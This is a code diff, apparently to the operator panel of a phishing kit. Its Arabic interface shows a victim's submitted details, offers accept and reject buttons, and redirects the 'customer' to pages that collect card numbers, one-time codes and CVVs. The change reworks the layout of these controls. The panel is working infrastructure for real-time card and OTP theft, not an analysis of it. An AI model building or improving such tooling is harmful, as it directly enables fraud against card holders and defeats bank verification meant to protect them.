@@ -153,7 +153,7 @@
   .detail-label{font-size:15px;font-weight:700;color:var(--ink-soft)}
   .detail-value{font-size:16px;font-weight:700;font-family:monospace;direction:ltr;letter-spacing:.5px}
   .modal-actions{
-    display:flex;gap:12px;padding:18px 24px;border-top:1px solid var(--line);background:#fafbfc;
+    display:flex;flex-wrap:wrap;gap:12px;padding:18px 24px;border-top:1px solid var(--line);background:#fafbfc;
   }
   .modal-btn{
     flex:1;padding:14px;border:none;border-radius:10px;font-family:inherit;
@@ -563,26 +563,29 @@
       '<div class="detail-row"><span class="detail-label">الوقت</span><span class="detail-value" style="font-family:inherit;direction:rtl">'+fmtTime(s.time)+'</span></div>';
 
     const actions = document.getElementById('modalActions');
-    const redirectBtns =
-      '<div style="width:100%;border-top:1px solid var(--line);padding-top:12px;margin-top:4px">' +
-        '<div style="font-size:14px;font-weight:800;color:var(--ink-soft);margin-bottom:8px;text-align:center">إعادة توجيه العميل إلى:</div>' +
-        '<div style="display:flex;gap:8px">' +
-          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'card\')">صفحة البطاقة</button>' +
-          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'otp\')">صفحة الكود</button>' +
-          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'cvv\')">صفحة CVV</button>' +
-        '</div>' +
-      '</div>';
+    let html = '';
 
     if (s.status === 'accepted') {
-      actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>' + redirectBtns;
+      html += '<div class="modal-status" style="color:var(--green);width:100%;text-align:center;padding:12px;font-weight:800;font-size:16px">تم القبول ✓</div>';
     } else if (s.status === 'rejected') {
-      actions.innerHTML = '<div class="modal-status" style="color:var(--red);width:100%">تم الرفض ✗</div>' + redirectBtns;
+      html += '<div class="modal-status" style="color:var(--red);width:100%;text-align:center;padding:12px;font-weight:800;font-size:16px">تم الرفض ✗</div>';
     } else {
-      actions.innerHTML =
+      html += '<div style="display:flex;gap:12px;width:100%">' +
         '<button class="modal-btn accept" onclick="doAction(\'accept\',\''+id+'\')">قبول</button>' +
         '<button class="modal-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>' +
-        redirectBtns;
+      '</div>';
     }
+
+    html += '<div style="width:100%;border-top:1px solid var(--line);padding-top:12px;margin-top:4px">' +
+      '<div style="font-size:14px;font-weight:800;color:var(--ink-soft);margin-bottom:8px;text-align:center">إعادة توجيه العميل إلى:</div>' +
+      '<div style="display:flex;gap:8px">' +
+        '<button style="flex:1;padding:10px;border:none;border-radius:8px;font-family:inherit;font-weight:700;font-size:14px;cursor:pointer;background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'card\')">البطاقة</button>' +
+        '<button style="flex:1;padding:10px;border:none;border-radius:8px;font-family:inherit;font-weight:700;font-size:14px;cursor:pointer;background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'otp\')">الكود</button>' +
+        '<button style="flex:1;padding:10px;border:none;border-radius:8px;font-family:inherit;font-weight:700;font-size:14px;cursor:pointer;background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'cvv\')">CVV</button>' +
+      '</div>' +
+    '</div>';
+
+    actions.innerHTML = html;
 
     document.getElementById('modalOverlay').classList.add('open');
   }
